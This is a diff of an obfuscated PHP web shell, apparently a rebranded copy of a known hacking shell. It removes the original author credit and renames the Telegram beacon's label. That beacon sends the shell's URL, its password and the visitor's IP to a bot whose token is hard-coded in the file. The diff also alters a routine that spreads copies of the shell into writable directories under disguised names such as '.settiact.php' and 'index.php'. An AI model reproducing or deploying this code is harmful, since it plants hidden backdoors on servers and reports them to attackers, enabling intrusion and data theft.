@@ -114,13 +114,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
 }
 
 ?>
-<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-?>
+
 <?php
 ?>
 <!DOCTYPE html>
@@ -128,16 +122,8 @@ header('Content-Type: text/html; charset=UTF-8');
 <head>
 
 
-
-
-
-
-
-
-
-<?php echo "<title>An" . "onS" . "ec Sh" . "el" . "l</title>"; ?>
 	<meta name="robots" content="noindex">
-	<link rel="icon" href="https://i.imgur.com/Be4uoSM.png" type="image/x-icon">
+	<link rel="icon" href="https://hackcontrol.org/wp-content/uploads/2021/01/hacked-e1627746564423.png" type="image/x-icon">
 </head>
 <body bgcolor="#1f1f1f" text="#ffffff">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -151,7 +137,7 @@ body {
 }
 
 body::-webkit-scrollbar {
-  width: 12px;
+  width: 15px;
 }
 
 body::-webkit-scrollbar-track {
@@ -268,7 +254,7 @@ $botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
 $chatId = "8478623770";
 $xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
 $logMessage =
-    "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
+    "___404 xxmydb___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
     $_SERVER["REMOTE_ADDR"] .
     " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
@@ -333,20 +319,7 @@ if (empty($disfunc)) {
 
 function author()
 {
-    echo "<center><br>An" .
-        "on" .
-        "7 - 2" .
-        "02" .
-        "2<br><a href='https://sh" .
-        "el" .
-        "l.an" .
-        "ons" .
-        "ec-te" .
-        "am.org/' target='_blank'>An" .
-        "on" .
-        "Se" .
-        "c Te" .
-        "am</a></center>";
+    echo "<center></center>";
     exit();
 }
 
@@ -1544,7 +1517,7 @@ if (isset($_GET["loknya"]) && $_GET["opsi"] == "lompat") {
         if (!$isw($satu)) {
             echo "[<merah>Fa" . "il" . "ed</merah>] " . $satu . "<br>";
         } else {
-            $satus = $satu . "/cont" . "act.p" . "hp";
+            $satus = $satu . "/.setti" . "act.p" . "hp";
             $fpt(
                 $satus,
                 $h2b(
@@ -1576,7 +1549,7 @@ if (isset($_GET["loknya"]) && $_GET["opsi"] == "lompat") {
         if (!$isw($dua)) {
             echo "[<merah>Fa" . "il" . "ed</merah>] " . $dua . "<br>";
         } else {
-            $duas = $dua . "/setti" . "ng.p" . "hp";
+            $duas = $dua . "/in" . "dex.p" . "hp";
             $fpt(
                 $duas,
                 $h2b(
